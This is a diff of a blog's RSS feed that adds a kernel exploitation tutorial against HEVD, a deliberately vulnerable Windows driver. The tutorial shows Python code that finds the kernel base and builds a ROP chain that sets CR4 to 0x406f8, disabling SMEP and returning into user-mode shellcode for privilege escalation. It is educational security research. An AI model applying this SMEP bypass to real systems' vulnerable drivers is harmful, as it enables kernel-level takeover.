@@ -6,9 +6,136 @@
 </description>
     <link>https://sizzop.github.io/</link>
     <atom:link href="https://sizzop.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 16 Aug 2016 13:02:37 -0400</pubDate>
-    <lastBuildDate>Tue, 16 Aug 2016 13:02:37 -0400</lastBuildDate>
+    <pubDate>Sun, 12 Mar 2017 22:13:05 -0400</pubDate>
+    <lastBuildDate>Sun, 12 Mar 2017 22:13:05 -0400</lastBuildDate>
     <generator>Jekyll v3.1.6</generator>
+    
+      <item>
+        <title>Kernel Hacking With HEVD Part 5 - The SMEP Version</title>
+        <description>&lt;p&gt;Our &lt;a href=&quot;/2016/07/08/kernel-hacking-with-hevd-part-4.html&quot;&gt;last exploit&lt;/a&gt; works quite well on Windows 7. However on Windows 8 and above a new mitigation has been deployed that stops this exploit in its tracks. Supervisor Mode Execution Protection (SMEP) is basically the ring 0 version of DEP. It prevents the CPU from executing instructions at a lower privilege level (or higher ring level) than it is currently running in. In other words, when running in kernel-mode, the processor will not run instructions mapped into user-mode memory.&lt;/p&gt;
+
+&lt;p&gt;If you recall from our Windows 7 exploit we mapped out some memory and copied our shellcode into it. Once we hijacked execution flow in the kernel we pointed it to our user-land memory buffer with the shellcode and the game was over. If we tried this on a system with SMEP enabled then it would generate a fault as soon as the processor (running in ring 0) attempted to execute any of the instructions our user-land memory buffer, i.e. our shellcode.&lt;/p&gt;
+
+&lt;p&gt;In keeping with the parallels between DEP and SMEP, the solution is the same - execute a ROP chain so that only kernel-mode code is run (at least at first). When attempting to defeat DEP, one common method is to just make enough of a ROP chain to disable DEP and then return back into your shellcode. This is essentially what we will do for our kernel exploit as well - craft a ROP chain to disable SMEP and then return into our user-mode shellcode as if nothing happened.&lt;/p&gt;
+
+&lt;p&gt;So how do we disable SMEP? The Windows kernel enumerates which processor features are available and when it sees that the processor supports SMEP then it enables SMEP. It does this by setting the proper bit in the &lt;a href=&quot;https://en.wikipedia.org/wiki/Control_register#CR4&quot;&gt;CR4 register&lt;/a&gt; to indicate that SMEP should be enforced. Naturally then the easiest path to bypassing SMEP when we have control of the stack (as in our HEVD stack overflow) is simply to fiddle with the CR4 register so that Windows is fooled into thinking that the processor does not support SMEP (more background on this technique &lt;a href=&quot;http://www.alex-ionescu.com/?p=231&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;http://j00ru.vexillium.org/?p=783&quot;&gt;here&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;SO THEN, with that background info, let’s take a look at the game-plan for our exploit. It will be mostly the same as our Windows 7 HEVD stack-overflow exploit but before we trigger the overflow we first must execute our ROP chain to disable SMEP. And in order to build our ROP chain we must find the base address of the kernel so that we can find our gadgets. Here’s the plan:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Spawn cmd.exe process&lt;/li&gt;
+  &lt;li&gt;Allocate buffer with shellcode&lt;/li&gt;
+  &lt;li&gt;Get kernel base address&lt;/li&gt;
+  &lt;li&gt;Build out our ROP chain&lt;/li&gt;
+  &lt;li&gt;Get a handle to the vulnerable device&lt;/li&gt;
+  &lt;li&gt;Get the correct IOCTL for the stack overflow function&lt;/li&gt;
+  &lt;li&gt;Create a buffer that redirects execution into ROP chain/shellcode&lt;/li&gt;
+  &lt;li&gt;Trigger the vulnerable code&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;There are only two new steps here so I will skip everything else (see &lt;a href=&quot;/2016/07/08/kernel-hacking-with-hevd-part-4.html&quot;&gt;part 4&lt;/a&gt; for those details). Moving right along…&lt;/p&gt;
+
+&lt;h4 id=&quot;step-three---get-kernel-base-address&quot;&gt;Step three - get kernel base address&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Spawn cmd.exe process&lt;/li&gt;
+    &lt;li&gt;Allocate buffer with shellcode&lt;/li&gt;
+    &lt;li&gt;&lt;strong&gt;Get kernel base address &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+    &lt;li&gt;Build out our ROP chain&lt;/li&gt;
+    &lt;li&gt;Get a handle to the vulnerable device&lt;/li&gt;
+    &lt;li&gt;Get the correct IOCTL for the stack overflow function&lt;/li&gt;
+    &lt;li&gt;Create a buffer that redirects execution into ROP chain/shellcode&lt;/li&gt;
+    &lt;li&gt;Trigger the vulnerable code&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;In our case we are assuming a bit of an advantage that is not always a given. Just like how in using ROP to defeat DEP in user-land you can have ASLR get in your way, so using ROP to defeat SMEP in kernel-land can be hindered by KASLR (Kernel ASLR). The advantage that we are allowing ourselves here is that we have a normal user account with a Medium &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/bb625957.aspx&quot;&gt;integrity level&lt;/a&gt;. Given this position, we are able to access certain Windows APIs that make KASLR a non-issue. If we were exploiting an application running in a sandbox or otherwise implemented in Low integrity then we would be denied access to these APIs. There are of course various methods of defeating KASLR but that’s outside of the scope of this article.&lt;/p&gt;
+
+&lt;p&gt;Anyway, this task is super easy with the &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/ms682617(v=vs.85).aspx&quot;&gt;EnumDeviceDrivers function&lt;/a&gt; of psapi.dll. As MSDN says, it “Retrieves the load address for each device driver in the system.” This includes the actual kernel in the returned results. Every time I tried this in my setup, the kernel (“nt” module) was the first element of the array so I cut a corner and skipped checking the name. Check out MSDN for the particulars, but the code I came up with looks like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+    Get kernel base address.
+    This function uses psapi!EnumDeviceDrivers which is only callable
+    from a non-restricted caller (medium integrity or higher). Also the
+    assumption is made that the kernel is the first array element returned.&quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*]Enumerating kernel base address...&quot;&lt;/span&gt;
+    
+    &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_ulonglong&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpImageBase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpImageBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpcbNeeded&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EnumDeviceDrivers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpImageBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# _Out_ LPVOID&lt;/span&gt;
+                            &lt;span class=&quot;n&quot;&gt;cb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                 &lt;span class=&quot;c&quot;&gt;# _In_  DWORD&lt;/span&gt;
+                            &lt;span class=&quot;n&quot;&gt;byref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpcbNeeded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# _Out_ LPDWORD&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-]Unable to get kernel base: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FormatError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+]Got kernel base: 0x&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;x&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpImageBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpImageBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;step-four---build-out-our-rop-chain&quot;&gt;Step four - build out our ROP chain&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Spawn cmd.exe process&lt;/li&gt;
+    &lt;li&gt;Allocate buffer with shellcode&lt;/li&gt;
+    &lt;li&gt;Get kernel base address&lt;/li&gt;
+    &lt;li&gt;&lt;strong&gt;Build out our ROP chain &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+    &lt;li&gt;Get a handle to the vulnerable device&lt;/li&gt;
+    &lt;li&gt;Get the correct IOCTL for the stack overflow function&lt;/li&gt;
+    &lt;li&gt;Create a buffer that redirects execution into ROP chain/shellcode&lt;/li&gt;
+    &lt;li&gt;Trigger the vulnerable code&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This post assumes you are already comfortable with ROP techniques. Now that we are armed with the kernel base address we can proceed to build out the ROP chain that will disable SMEP. I am cutting another corner here in that the ROP gadget offsets should be determined dynamically to make the exploit more robust, work across patch levels, etc. This wouldn’t be very difficult since this is a very small ROP chain and would only require parsing ntoskrnl.exe for a couple of byte arrays. I am hardcoding them instead so it works in my setup on this patch level… YMMV.&lt;/p&gt;
+
+&lt;p&gt;Essentially the idea here is to pop a controlled value into the CR4 register. After searching through the available ROP gadgets, there aren’t a whole lot of instructions that interact with CR4 which may not come as much of a surprise. Certainly there aren’t any POP CR4 gadgets, but we can get pretty close. The KiFlushCurrentTbWorker function inside ntoskrnl.exe actually gives us a really nice gadget we can use:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:000000014008655A      mov     cr4, rcx
+.text:000000014008655D      retn
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The only other gadget we’ll need then is a POP RCX which is plentiful in the large address space of the kernel.&lt;/p&gt;
+
+&lt;p&gt;The controlled value we want to have end up in CR4 will be a bitmask that keeps the system relatively sane but turns the SMEP flag to a 0. A little bit of research (e.g. &lt;a href=&quot;https://www.nccgroup.trust/globalassets/our-research/uk/whitepapers/2015/09/2015-08-28_-_ncc_group_-_exploiting_cve_2015_2426_-_release.pdf&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;http://www.siberas.de/papers/Pwn2Own_2014_AFD.sys_privilege_escalation.pdf&quot;&gt;here&lt;/a&gt;) shows that the value 0x406f8 fits the bill nicely.&lt;/p&gt;
+
+&lt;p&gt;Finally we can build a function which takes the base address of the kernel and the user-land address of the shellcode, throw together the two gadgets along with the new CR4 value, and end up in the shellcode buffer. Putting it all together, I have the following code:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;build_rop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;krnlBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;Build ROP chain with offsets of kernel base for disabling SMEP.&quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;filler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;AAAAAAAA&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;257&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;krnlBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20b29&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;# pop rcx ; ret&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x406f8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;# (popped into rcx)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;krnlBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8655a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;# mov cr4, rcx ; ret&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;              &lt;span class=&quot;c&quot;&gt;# (return into shellcode)&lt;/span&gt;
+        
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rop&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;That’s it! Everything else in the exploit is pretty much the same. If all goes to plan, the result should look something like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hevd5-ss1.jpg&quot; alt=&quot;pwnd&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You can see the complete code on &lt;a href=&quot;https://github.com/sizzop/HEVD-Exploits/blob/master/Win8.1x64/HEVD-stack-overflow.py&quot;&gt;my github&lt;/a&gt;. Enjoy!&lt;/p&gt;
+</description>
+        <pubDate>Tue, 13 Sep 2016 00:00:00 -0400</pubDate>
+        <link>https://sizzop.github.io/2016/09/13/kernel-hacking-with-hevd-part-5.html</link>
+        <guid isPermaLink="true">https://sizzop.github.io/2016/09/13/kernel-hacking-with-hevd-part-5.html</guid>
+        
+        
+      </item>
     
       <item>
         <title>The Pentesters - 64bit AppSec Challenge</title>
@@ -163,7 +290,7 @@ n00b@64bitprimer:~/level4$
 
 &lt;p&gt;chall5.py:&lt;/p&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
 &lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;angr&lt;/span&gt;
 &lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
